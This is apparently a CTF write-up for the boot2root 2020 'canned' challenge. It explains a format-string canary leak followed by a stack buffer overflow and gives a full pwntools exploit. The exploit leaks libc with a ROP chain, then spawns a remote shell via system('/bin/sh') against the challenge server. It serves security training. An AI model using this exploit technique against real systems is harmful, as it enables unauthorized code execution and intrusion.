# boot2root 2020

## canned

> 491
>
> I think i got my flag stuck in a can, can you open it for me
>
> `nc 35.238.225.156 1007`
>
> Author: Viper_S
> 
> [canned](canned)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _rop_ _format-string_ _stack-canary_


## Summary

ROP with stack canary leaked using format-string.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE with Canary; BOF/ROP if we can leak canary.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  __gid_t __rgid;
  long in_FS_OFFSET;
  char local_48 [32];
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("Say something please");
  fgets(local_48,0x10,stdin);
  printf(local_48);
  puts("That ain\'t it, try something else maybe");
  fgets(local_28,100,stdin);
  puts("I think you are done now, good bye");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

`printf(local_48)` is the first vulnerability, however the `fgets` that proceeds it will only read `0x10` bytes (16, 15 actually since the last byte will be `\0`).  There's not a lot we can do with 15 bytes except leak the value of the canary (`local_10`), which is all we need to leverage the second vulnerability--a BOF from `fgets(local_28,100,stdin)`.  `local_28` is `0x28` (40) bytes from the return address, leaving us 60 bytes to craft a ROP chain (we only need 24 bytes).

Finding the value to pass `printf` to leak the canary is pretty simple with GDB + GEF:

First, set a break point at `leave` within `main`:

```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401182 <+0>:    push   rbp
   0x0000000000401183 <+1>:    mov    rbp,rsp
   ...
   0x0000000000401254 <+210>:    leave
   0x0000000000401255 <+211>:    ret
End of assembler dump.
gef➤  b *main+210
```

Next, set GEF to show more stack lines and start the binary:

```
gef➤  gef config context.nb_lines_stack 16
gef➤  run
```

Answer the prompts from the binary, then at the break look above `rbp` (`local_10`):

```
0x00007fffffffe340│+0x0000: 0x00000000000000c2  ← $rsp
0x00007fffffffe348│+0x0008: 0x00000000ffffe377
0x00007fffffffe350│+0x0010: 0x00007fffffff000a  →  0x0000000000000000  ← $r10
0x00007fffffffe358│+0x0018: 0x00000000004012a5  →  <__libc_csu_init+69> add rbx, 0x1
0x00007fffffffe360│+0x0020: 0x00007ffff7fb2fc8  →  0x0000000000000000
0x00007fffffffe368│+0x0028: 0x0000000000401260  →  <__libc_csu_init+0> push r15
0x00007fffffffe370│+0x0030: 0x000000000000000a
0x00007fffffffe378│+0x0038: 0x00000000004010a0  →  <_start+0> xor ebp, ebp
0x00007fffffffe380│+0x0040: 0x00007fffffffe480  →  0x0000000000000001
0x00007fffffffe388│+0x0048: 0x17835412470ecb00
0x00007fffffffe390│+0x0050: 0x0000000000000000  ← $rbp
```

`0x17835412470ecb00` is the canary (`local_10`) and can be verified with:

```
gef➤  canary
[+] Found AT_RANDOM at 0x7fffffffe6e9, reading 8 bytes
[+] The canary of process 23173 is 0x17835412470ecb00
```

Next, to find the format-string for `printf` to have it leak the canary, just `run` again, but at the binary prompt `Say something please`, enter `$n%p` where `n` is a number starting at `1`, keep incrementing until `canary` matches, e.g.:

```
gef➤  run
Starting program: /pwd/datajerk/boot2root2020/canned/canned
Say something please
%15$p
0xb547a799fc7ba200
```

Press enter at the prompt `That ain't it, try something else maybe`, then check with:

```
gef➤  canary
[+] Found AT_RANDOM at 0x7fffffffe6e9, reading 8 bytes
[+] The canary of process 23789 is 0xb547a799fc7ba200
```

A match!  So `%15$p` is what we need to leak the canary.

The rest is standard CTF fare, use BOF/ROP to leak libc and score a second pass, then use `system` from libc for a shell.

> It is possible to also leak libc from the stack. `%15$p` only uses 5 bytes and we have 10 more to spare, however we also need to know the version of libc, we could have probably ran strings on the binary to get a close guess and then used that to get the right offset to `__libc_start_main`, but the two pass method is easy, portable, and what I did here (was a cut/paste job from my other write-ups).


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./canned')
context.log_level = 'INFO'
libc_index = 0

while True:
```

[Most of] these CTFs require that you figure out the remote libc version and download it for your exploits.  It gets really old, so I automated it.  The `libc_index = 0` gets incremented if the _guessed_ libc fails to spawn a shell.  The `while True:` is the main loop that _tries_ each _guessed_ version of libc, usually the first one is correct.

```python
    if args.REMOTE:
        p = remote('35.238.225.156', 1007)
    else:
        p = process(binary.path)
        libc = binary.libc

    p.sendlineafter('Say something please\n', '%15$p')
    _ = p.recvline().strip()
    canary = int(_,16)
    log.info('canary: ' + hex(canary))

    rop = ROP([binary])
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

    payload  = b''
    payload += (0x28 - 0x10) * b'A'
    payload += p64(canary)
    payload += (0x28 - len(payload)) * b'B'
    payload += p64(pop_rdi)
    payload += p64(binary.got.puts)
    payload += p64(binary.plt.puts)
    payload += p64(binary.sym.main)

    p.sendlineafter('That ain\'t it, try something else maybe\n',payload)
    p.recvline()

    _ = p.recv(6)
    puts = u64(_ + b'\0\0')
    log.info('puts: ' + hex(puts))
```

Above is the first pass.  After leaking the canary, we write out some garbage (`0x28 - 0x10` is the distance between `local_28` (from `fgets`) and the canary (`local_10`)), followed by the `canary`, then garbage to the return address (`local_28` is `0x28` bytes from the return address, the total payload should be `0x28` in length at this point).

With the padding and canary bypass in place, we have `puts` leak itself, then loop back to `main` while capturing the `puts` address.

```python
    if not 'libc' in locals():
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
        while True:
            libc_url = r.json()[libc_index]['download_url']
            if context.arch in libc_url:
                break
            libc_index += 1
        log.info('libc_url: ' + libc_url)
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
        libc = ELF(libc_file)
```

Above is the lazy pass.  This will take the leaked `puts` least significant three nibbles and try to find a match using the libc-database [online](https://libc.rip)--These guys are are the best!  _Thanks for the API!_

If the arch is not a match, then It'll try the next; when there is a match the libc is downloaded and setup as the candidate libc to test for a shell.

```python
    libc.address = puts - libc.sym.puts
    log.info('libc.address: ' + hex(libc.address))

    p.sendlineafter('Say something please\n', 'something')
    p.recvline()

    payload  = b''
    payload += (0x28 - 0x10) * b'A'
    payload += p64(canary)
    payload += (0x28 - len(payload)) * b'B'
    payload += p64(pop_rdi + 1)
    payload += p64(pop_rdi)
    payload += p64(libc.search(b'/bin/sh').__next__())
    payload += p64(libc.sym.system)

    p.sendlineafter('That ain\'t it, try something else maybe\n',payload)

    try:
        p.recvline()
        time.sleep(1)
        p.sendline('echo shell')
        if b'shell' in p.recvline():
            p.interactive()
            break
    except:
        libc_index += 1
        p.close()
```

Above is the second pass.  This will compute the base of libc and use the same bypass payload as before however this time will use libc to get a shell.

The `try` block will do an `echo` test for a shell, if that fails, then back to the top, and the next libc candidate will be tested until we get a shell (works every time :-).

> `pop_rdi+1` is the same as `ret` and is used to align the stack, otherwise `system` would segfault (see [blind-piloting](https://github.com/datajerk/ctf-write-ups/tree/master/b01lersctf2020/blind-piloting) and search for stack-alignment).  The next instruction will pop the address of `/bin/sh` into `rdi` (required for `system`). Lastly, `system` is called.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/canned/canned'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 35.238.225.156 on port 1007: Done
[*] canary: 0x6570a4d24c9ee600
[*] Loaded 14 cached gadgets for './canned'
[*] puts: 0x7fa9a78a4aa0
[*] libc_url: https://libc.rip/download/libc6_2.27-3ubuntu1.3_amd64.so
[*] getting: https://libc.rip/download/libc6_2.27-3ubuntu1.3_amd64.so
[*] '/pwd/datajerk/boot2root2020/canned/libc6_2.27-3ubuntu1.3_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fa9a7824000
[*] Switching to interactive mode
$ cat flag
b00t2root{d0_U_h4V3_a_C4N_0pen3R?}
```

> Notice above the detection and download of the challenge libc.
